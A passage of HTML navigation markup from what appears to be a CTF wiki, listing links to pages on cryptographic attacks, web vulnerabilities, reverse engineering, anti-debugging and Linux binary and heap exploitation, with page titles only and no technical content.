    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack-zh/" class="md-nav__link">
      Public Key Index Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack-zh/" class="md-nav__link">
      Private Key d Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/" class="md-nav__link">
      Coppersmith Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/" class="md-nav__link">
      Chosen Plain Cipher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel-zh/" class="md-nav__link">
      Side Channel Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/" class="md-nav__link">
      Bleichenbacher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/knapsack/knapsack-zh/" class="md-nav__link">
      Knapsack Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
    
    <label class="md-nav__link" for="nav-3-6-4">
      Discrete Log Correlation
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Discrete Log Correlation" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-4">
        <span class="md-nav__icon md-icon"></span>
        Discrete Log Correlation
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log-zh/" class="md-nav__link">
      Discrete Logarithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal-zh/" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/ecc-zh/" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
    
    <label class="md-nav__link" for="nav-3-6-5">
      Lattice-based Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Lattice-based Cryptography" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-5">
        <span class="md-nav__icon md-icon"></span>
        Lattice-based Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/overview-zh/" class="md-nav__link">
      Lattice Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/introduction-zh/" class="md-nav__link">
      Introduction to Lattices
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction-zh/" class="md-nav__link">
      Lattice-based Algorithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/cvp-zh/" class="md-nav__link">
      CVP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      Hash Function
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Hash Function" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        <span class="md-nav__icon md-icon"></span>
        Hash Function
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/introduction-zh/" class="md-nav__link">
      Introduction to the Hash Function
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/md5-zh/" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/sha1-zh/" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/fnv-zh/" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/attack-zh/" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
    
    <label class="md-nav__link" for="nav-3-8">
      Digital Signature
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Digital Signature" data-md-level="2">
      <label class="md-nav__title" for="nav-3-8">
        <span class="md-nav__icon md-icon"></span>
        Digital Signature
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/introduction-zh/" class="md-nav__link">
      Introduction to Digital Signatures
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/rsa-zh/" class="md-nav__link">
      RSA Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/elgamal-zh/" class="md-nav__link">
      ElGamal Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/dsa-zh/" class="md-nav__link">
      DSA Digital Signature
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
    
    <label class="md-nav__link" for="nav-3-9">
      Summary of Attack Techniques
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary of Attack Techniques" data-md-level="2">
      <label class="md-nav__title" for="nav-3-9">
        <span class="md-nav__icon md-icon"></span>
        Summary of Attack Techniques
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/attack-mode-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/meet-in-the-middle-zh/" class="md-nav__link">
      Intermediate Encounter Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/bit-attack-zh/" class="md-nav__link">
      Bit attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/certificate/introduction-zh/" class="md-nav__link">
      Certificate Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Web" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon"></span>
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/introduction-zh/" class="md-nav__link">
      Introduction to Web Applications
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/sqli-zh/" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/xss-zh/" class="md-nav__link">
      XSS Cross-site Scripting Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/csrf-zh/" class="md-nav__link">
      CSRF Cross-site Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/ssrf-zh/" class="md-nav__link">
      SSRF Server Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/php/php-zh/" class="md-nav__link">
      PHP Code Auditing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Assembly" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/x86-x64/readme-zh/" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/mips/readme-zh/" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/arm/readme-zh/" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Executable" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        <span class="md-nav__icon md-icon"></span>
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ELF file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        <span class="md-nav__icon md-icon"></span>
        ELF file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/elf-structure-zh/" class="md-nav__link">
      ELF File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-loading-zh/" class="md-nav__link">
      Program Loading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-linking-zh/" class="md-nav__link">
      Program Link
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/running-overview-zh/" class="md-nav__link">
      Program Execution Flow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
    
    <label class="md-nav__link" for="nav-6-2">
      PE file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="PE file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-2">
        <span class="md-nav__icon md-icon"></span>
        PE file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-excutable-zh/" class="md-nav__link">
      PE File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-import-table-zh/" class="md-nav__link">
      PE Import Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-export-table-zh/" class="md-nav__link">
      PE Export Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-relocation-table-zh/" class="md-nav__link">
      PE Relocation Table
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse Engineering
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        <span class="md-nav__icon md-icon"></span>
        Reverse Engineering
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        <span class="md-nav__icon md-icon"></span>
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/introduction-zh/" class="md-nav__link">
      Software Reverse Engineering Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/Identify-Encode-Encryption/introduction-zh/" class="md-nav__link">
      Common Encryption Algorithms and Code Recognition
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/maze/maze-zh/" class="md-nav__link">
      Labyrinth Problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/vm/vm-zh/" class="md-nav__link">
      Virtual Machine Command Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/unicorn/introduction-zh/" class="md-nav__link">
      Unicorn Engine Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux Reverse Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/ld_preload-zh/" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/false-disasm-zh/" class="md-nav__link">
      Incorrect Disassembly Fix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-bp-zh/" class="md-nav__link">
      Detecting Breakpoints Bypassing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-dbg-zh/" class="md-nav__link">
      Detecting Debugging Bypassing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      Shelling Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Shelling Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        <span class="md-nav__icon md-icon"></span>
        Shelling Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/packer-introduction-zh/" class="md-nav__link">
      Introduction to the Protective case
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/trace-zh/" class="md-nav__link">
      Single Step Tracking Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/esp-zh/" class="md-nav__link">
      ESP Law
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/direct-oep-zh/" class="md-nav__link">
      One Step to the OEP Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/memory-zh/" class="md-nav__link">
      Memory Mirroring Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/last-exception-zh/" class="md-nav__link">
      Last Exception Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/sfx-zh/" class="md-nav__link">
      SFX Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/fix-iat-zh/" class="md-nav__link">
      DUMP and IAT Reconstruction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/manually-fix-iat-zh/" class="md-nav__link">
      Manually Find the IAT and Rebuild It Using ImportREC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/unpack-dll-zh/" class="md-nav__link">
      DLL File Unpacking
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      Anti-debugging Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Anti-debugging Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        <span class="md-nav__icon md-icon"></span>
        Anti-debugging Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntglobalflag-zh/" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/heap-flags-zh/" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/the-heap-zh/" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/int-3-zh/" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent-zh/" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/zwsetinformationthread-zh/" class="md-nav__link">
      ZwSetInformationThread
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/junk-code-zh/" class="md-nav__link">
      Flower command
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/example-zh/" class="md-nav__link">
      Anti-debug technical example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        <span class="md-nav__icon md-icon"></span>
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../readme-zh/" class="md-nav__link">
      Readme zh
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2">
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      Security Protection Mechanism
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Security Protection Mechanism" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        <span class="md-nav__icon md-icon"></span>
        Security Protection Mechanism
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../mitigation/canary-zh/" class="md-nav__link">
      Canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack-intro-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic-rop-zh/" class="md-nav__link">
      Basic ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium-rop-zh/" class="md-nav__link">
      Intermediate ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced-rop-zh/" class="md-nav__link">
      Advanced ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/fancy-rop-zh/" class="md-nav__link">
      ROP Tricks
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      Format String Vulnerability
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Format String Vulnerability" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        <span class="md-nav__icon md-icon"></span>
        Format String Vulnerability
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro-zh/" class="md-nav__link">
      Format String Vulnerability Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit-zh/" class="md-nav__link">
      Format String Exploit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example-zh/" class="md-nav__link">
      Format String Vulnerability Example
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect-zh/" class="md-nav__link">
      Format String Vulnerability Detection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4">
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Glibc Heap Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        <span class="md-nav__icon md-icon"></span>
        Glibc Heap Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../introduction-zh/" class="md-nav__link">
      Introduction to Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_overview-zh/" class="md-nav__link">
      Heap Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_structure-zh/" class="md-nav__link">
      Heap Related Data Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      In-depth Understanding of Ptmalloc2
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="In-depth Understanding of Ptmalloc2" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        In-depth Understanding of Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/overview-zh/" class="md-nav__link">
      Implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/basic-zh/" class="md-nav__link">
      Basic Functions in the heap implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/heap-init-zh/" class="md-nav__link">
      Heap Initialization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc-zh/" class="md-nav__link">
      Allocate Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/free-zh/" class="md-nav__link">
      Free Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/tcache-zh/" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc_state-zh/" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/misc-zh/" class="md-nav__link">
      Other
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heapoverflow_basic-zh/" class="md-nav__link">
      Heap Overflow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../off_by_one-zh/" class="md-nav__link">
      Heap-based Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../chunk_extend_overlapping-zh/" class="md-nav__link">
      Chunk Extend/Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unlink-zh/" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../use_after_free-zh/" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


